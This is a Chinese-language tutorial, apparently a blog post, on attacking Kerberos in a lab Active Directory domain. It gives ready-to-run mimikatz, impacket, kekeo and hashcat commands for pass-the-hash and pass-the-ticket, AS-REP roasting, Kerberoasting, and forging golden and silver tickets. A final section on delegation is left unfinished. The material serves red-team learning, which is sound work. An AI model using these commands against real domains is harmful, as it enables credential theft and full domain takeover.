# 一、Pass The *

在Kerberos流程中预认证部分，`Client`会发送经用户哈希加密的时间戳作为凭据，如果使用明文密码，实际上也是加密成哈希再使用的，所以有用户哈希就可以进行预认证环节。

## 1. Pass The Key/Overpass The Hash

`Overpass The Hash`指的是在仅支持Kerberos协议的情况下，使用用户哈希来向KDC请求获得Kerberos TGT票据，用户哈希实际上就是RC4类型的密钥。

`Pass The Key`指的是在Kerberos预认证阶段，使用其他类型的 Kerberos 密钥（DES、AES-128、AES-256）来进行认证。

利用`mimikatz`来进行`Overpass The Hash`，需要本地管理员权限：

```
privilege::debug
sekurlsa::pth /user:user1 /domain:hack.org /ntlm:a45a7246dd74b64a67f22fd7020f1bd8
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211029150458QvFgIo.png#alt=)

或者使用`impacket`工具包`getTGT.py`申请TGT：

```
python getTGT.py hack.org/administrator -hashes :a45a7246dd74b64a67f22fd7020f1bd8
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202110291544364ltymH.png#alt=)

使用`mimikatz`导出key类型的密钥并利用，需要本地管理员权限：

```
privilege::debug
sekurlsa::ekeys
sekurlsa::pth /user:user1 /domain:hack.org /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c
```

`getTGT.py`的`-aesKey`参数也支持AES256类型的密钥。

## 2. Pass The Ticket

`Pass The Ticket`即票据传递攻击，攻击者获取票据，再使用票据访问对应的服务。

可以使用`getTGT.py`来获取票据，也可以使用kekeo：

```
tgt::ask /user:administrator /domain:hack.org /ntlm:a45a7246dd74b64a67f22fd7020f1bd8
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202110291605498uWxf5.png#alt=)

再导入票据：

```
kerberos::ptt TGT.kirbi
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211029163749t4QFqm.png#alt=)

# 二、用户名枚举

在预认证阶段，`Client`发送的用户名如果是不存在的，KDC会返回`KDC_ERR_C_PRINCIPAL_UNKNOWN`错误，可以借此来枚举用户名，这种通常适用于没有任何域内用户权限的情况下。

常用的工具：

- Krbguess，Java编写
- nmap的`krb5-enum-users`脚本
- msf的`auxiliary/gather/kerberos_enumusers`模块

# 三、密码喷洒

在有域内用户列表的情况下可以进行密码喷洒，密码喷洒也是爆破攻击，但是跟密码爆破不同的地方在于，密码爆破通常是对一个或多个用户名分别跑密码字典；而密码喷洒则是对多个用户名测试一个弱口令。这样的优势在于更不容易触发账户的密码错误锁定策略。

如果有域内权限，应该先尝试获取域内密码策略，主要关注：

- Maximum Password Age，密码过期时间，

- Minimum Password Length，密码最小长度
- Account Lockout Duration，被锁定的帐户在自动解锁前保持锁定的分钟数
- Account Lockout Threshold，允许登录失败次数

在有域内主机权限的情况下可以使用PowerView：

```powershell
(Get-DomainPolicy)."SystemAccess"
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211029212025zvcyok.png#alt=)

# 四、AS-REP Roasting

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202110292128401ejrsr.png#alt=)

如果用户配置了“不要求Kerberos预身份验证”，那攻击者就可以冒充这个用户向KDC发起`KRB_AS_REQ`请求，KDC会返回`KRB_AS_REP`，其中的`enc-part`部分是使用此用户的哈希加密的，通过对其离线破解，可以得到用户明文密码。

使用PowerView-dev发现不要求预认证的用户：

```powershell
Get-DomainUser -PreauthNotRequired -verbose
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211029214543Zze1Ok.png#alt=)

之后就可以请求获取`KRB_AS_REP`，利用`impacket`工具包：

```
GetNPUsers.py hack.org/user1:passW@rd123 -request -format hashcat -outputfile hashes.asreproast
```

使用hashcat破解：

```
hashcat -m 18200 --force -a 0 hashes.asreproast password.txt
```

# 五、Kerberoasting

Kerberoasting攻击指的是获得对应服务的ST，再对其进行离线破解以获得服务的哈希，只需要一个普通域内用户。

在`KRB_TGS_REP`消息中，`ticket`字段的`enc-part`是使用所请求的服务哈希加密的。Kerberoasting与`AS-REP Roasting`类似，请求获得`KRB_TGS_REP`消息，再离线破解`ticket`字段的`enc-part`，不过前者是破解服务账户，而`AS-REP Roasting`破解的是用户账户。

要关注高价值的服务，如使用用户账户启动的服务，因为机器账户的密码是随机生成的，很难破解。

使用`GetUserSPNs.py`查询域用户注册的SPN并请求ST：

```
GetUserSPNs.py -request -dc-ip 10.211.55.100 hack.org/user1 -outputfile hashes.kerberoast
```

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211029221041Ta72Cw.png#alt=)

后面还是使用hashcat破解即可。

# 六、黄金票据

黄金票据指的是在已经获得域控制器的krbtgt用户哈希的情况下，自行签发TGT，也就能获得域内任意服务的权限。

使用`mimikatz`来签发TGT：

```
mimikatz.exe "privilege::debug" "kerberos::golden /admin:administrator /domain:hack.org /id:500 /sid:S-1-5-21-656570226-3390374433-1712624621 /krbtgt:42251cf64a43e47905a4baf14cd44ca6 /ptt"
```

伪造了administrator用户的TGT，可以成功访问域控：

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20211101145333dhQ5s5.png#alt=)

# 七、白银票据

白银票据指的是在已经获得服务哈希的情况下，自行签发此服务的ST，可以获得服务的权限。

例如，我们现在有了域控制器主机账户的哈希，那么就可以签发对应服务也就是`cifs`的ST，使用mimikatz完成：

```
mimikatz.exe "privilege::debug" "kerberos::golden /user:administrator /domain:hack.org /id:500 /sid:S-1-5-21-656570226-3390374433-1712624621 /target:dc.hack.org /rc4:f5d2517c15020a8b531639109af535a1 /service:cifs /ptt" exit
```

`/rc4`参数即对应服务账户的NTLM哈希，`/service`参数为服务名：

![](https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202111011504038Wk5mo.png#alt=)

如果对应的服务配置了验证PAC，白银票据将失效。

# 八、委派（待完成）

## 1. 非约束委派

寻找配置了非约束委派的服务账户并获取其权限，让域管理员访问此服务，访问中会携带域管理员的TGT，并且缓存到内存中。

## 2. 约束委派

寻找配置了约束委派的服务账户并获取其权限，利用此账户可以代表任意用户申请可转发的ST，以访问另一个服务。

## 3. 基于资源的约束委派
